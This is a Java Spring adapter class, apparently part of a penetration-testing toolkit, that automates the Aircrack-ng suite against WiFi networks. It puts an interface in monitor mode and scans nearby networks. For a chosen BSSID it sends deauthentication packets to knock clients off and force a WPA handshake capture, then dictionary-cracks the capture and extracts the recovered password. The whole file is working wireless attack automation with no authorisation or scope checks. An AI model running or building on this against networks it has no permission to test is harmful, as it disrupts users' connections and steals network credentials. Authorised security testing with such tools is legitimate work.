package com.codexraziel.cybersec.adapters.wifi;

import com.codexraziel.cybersec.core.execution.*;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Professional adapter for Aircrack-ng suite
 * Integrates: airodump-ng, aireplay-ng, aircrack-ng
 */
@Slf4j
@Component
public class AircrackNgAdapter {
    
    @Autowired
    private ToolExecutor toolExecutor;
    
    private static final String AIRODUMP_NG = "airodump-ng";
    private static final String AIREPLAY_NG = "aireplay-ng";
    private static final String AIRCRACK_NG = "aircrack-ng";
    private static final String AIRMON_NG = "airmon-ng";
    
    /**
     * Check if Aircrack-ng suite is available
     */
    public boolean isAvailable() {
        return toolExecutor.isToolAvailable(AIRODUMP_NG) &&
               toolExecutor.isToolAvailable(AIRCRACK_NG);
    }
    
    /**
     * Get Aircrack-ng version
     */
    public String getVersion() {
        return toolExecutor.getToolVersion(AIRCRACK_NG);
    }
    
    /**
     * Put interface in monitor mode
     */
    public CompletableFuture<MonitorModeResult> enableMonitorMode(String interfaceName) {
        return CompletableFuture.supplyAsync(() -> {
            ToolConfig config = ToolConfig.builder()
                    .toolName(AIRMON_NG)
                    .executablePath(AIRMON_NG)
                    .arguments(List.of("start", interfaceName))
                    .build();
            
            ExecutionResult result = toolExecutor.execute(config);
            
            if (result.isSuccess()) {
                // Parse monitor interface name (usually wlan0mon)
                String monitorInterface = parseMonitorInterface(result.getStdout());
                return new MonitorModeResult(true, monitorInterface, result.getStdout());
            } else {
                return new MonitorModeResult(false, null, result.getStderr());
            }
        });
    }
    
    /**
     * Disable monitor mode
     */
    public CompletableFuture<Boolean> disableMonitorMode(String monitorInterface) {
        return CompletableFuture.supplyAsync(() -> {
            ToolConfig config = ToolConfig.builder()
                    .toolName(AIRMON_NG)
                    .executablePath(AIRMON_NG)
                    .arguments(List.of("stop", monitorInterface))
                    .build();
            
            ExecutionResult result = toolExecutor.execute(config);
            return result.isSuccess();
        });
    }
    
    /**
     * Start WiFi scanning with airodump-ng
     */
    public CompletableFuture<ScanResult> startScan(
            String monitorInterface,
            String outputPrefix,
            Consumer<String> outputCallback) {
        
        return CompletableFuture.supplyAsync(() -> {
            Path outputPath = Paths.get("/tmp", outputPrefix);
            
            ToolConfig config = ToolConfig.builder()
                    .toolName(AIRODUMP_NG)
                    .executablePath(AIRODUMP_NG)
                    .arguments(List.of(
                        "--output-format", "csv",
                        "--write", outputPath.toString(),
                        monitorInterface
                    ))
                    .timeout(java.time.Duration.ofMinutes(2))
                    .build();
            
            ExecutionResult result = toolExecutor.executeWithOutput(
                    config,
                    outputCallback,
                    outputCallback
            ).join();
            
            if (result.isSuccess()) {
                List<WiFiNetwork> networks = parseCsvOutput(outputPath.toString() + "-01.csv");
                return new ScanResult(true, networks, result.getStdout());
            } else {
                return new ScanResult(false, List.of(), result.getStderr());
            }
        });
    }
    
    /**
     * Capture handshake for specific network
     */
    public CompletableFuture<HandshakeResult> captureHandshake(
            String monitorInterface,
            String targetBSSID,
            String channel,
            String outputPrefix,
            Consumer<String> progressCallback) {
        
        return CompletableFuture.supplyAsync(() -> {
            Path outputPath = Paths.get("/tmp", outputPrefix);
            
            // Start airodump-ng targeting specific AP
            ToolConfig scanConfig = ToolConfig.builder()
                    .toolName(AIRODUMP_NG)
                    .executablePath(AIRODUMP_NG)
                    .arguments(List.of(
                        "--bssid", targetBSSID,
                        "--channel", channel,
                        "--write", outputPath.toString(),
                        monitorInterface
                    ))
                    .timeout(java.time.Duration.ofMinutes(5))
                    .build();
            
            // Execute in background
            CompletableFuture<ExecutionResult> scanFuture = toolExecutor.executeWithOutput(
                    scanConfig,
                    progressCallback,
                    progressCallback
            );
            
            // Wait a bit for scan to start
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            
            // Send deauth packets to force handshake
            deauthClient(monitorInterface, targetBSSID);
            
            // Wait for handshake capture
            ExecutionResult result = scanFuture.join();
            
            // Check if handshake was captured
            boolean hasHandshake = result.getStdout().contains("WPA handshake") ||
                                  result.getStdout().contains("EAPOL");
            
            return new HandshakeResult(hasHandshake, outputPath.toString() + "-01.cap", result.getStdout());
        });
    }
    
    /**
     * Send deauth packets to force clients to reconnect
     */
    private void deauthClient(String monitorInterface, String bssid) {
        ToolConfig deauthConfig = ToolConfig.builder()
                .toolName(AIREPLAY_NG)
                .executablePath(AIREPLAY_NG)
                .arguments(List.of(
                    "--deauth", "10",
                    "-a", bssid,
                    monitorInterface
                ))
                .timeout(java.time.Duration.ofSeconds(15))
                .build();
        
        toolExecutor.executeAsync(deauthConfig);
    }
    
    /**
     * Crack WPA/WPA2 password from capture file
     */
    public CompletableFuture<CrackResult> crackPassword(
            String captureFile,
            String wordlistPath,
            Consumer<String> progressCallback) {
        
        return CompletableFuture.supplyAsync(() -> {
            ToolConfig config = ToolConfig.builder()
                    .toolName(AIRCRACK_NG)
                    .executablePath(AIRCRACK_NG)
                    .arguments(List.of(
                        "-w", wordlistPath,
                        captureFile
                    ))
                    .timeout(java.time.Duration.ofHours(1))
                    .build();
            
            ExecutionResult result = toolExecutor.executeWithOutput(
                    config,
                    progressCallback,
                    progressCallback
            ).join();
            
            // Parse password from output
            String password = parsePassword(result.getStdout());
            
            return new CrackResult(password != null, password, result.getStdout());
        });
    }
    
    // Parsing helpers
    
    private String parseMonitorInterface(String output) {
        Pattern pattern = Pattern.compile("monitor mode (?:enabled|vif enabled) on (.+)");
        Matcher matcher = pattern.matcher(output);
        if (matcher.find()) {
            return matcher.group(1).trim();
        }
        // Default fallback
        return "wlan0mon";
    }
    
    private List<WiFiNetwork> parseCsvOutput(String csvFile) {
        List<WiFiNetwork> networks = new ArrayList<>();
        // TODO: Implement CSV parsing
        // For now, return empty list
        log.warn("CSV parsing not yet implemented for: {}", csvFile);
        return networks;
    }
    
    private String parsePassword(String output) {
        Pattern pattern = Pattern.compile("KEY FOUND! \\[ (.+) \\]");
        Matcher matcher = pattern.matcher(output);
        if (matcher.find()) {
            return matcher.group(1).trim();
        }
        return null;
    }
    
    // Result classes
    
    public record MonitorModeResult(boolean success, String monitorInterface, String output) {}
    public record ScanResult(boolean success, List<WiFiNetwork> networks, String output) {}
    public record HandshakeResult(boolean captured, String captureFile, String output) {}
    public record CrackResult(boolean found, String password, String output) {}
    
    public record WiFiNetwork(
            String ssid,
            String bssid,
            int channel,
            int signalStrength,
            String encryption,
            LocalDateTime discoveredAt
    ) {}
}
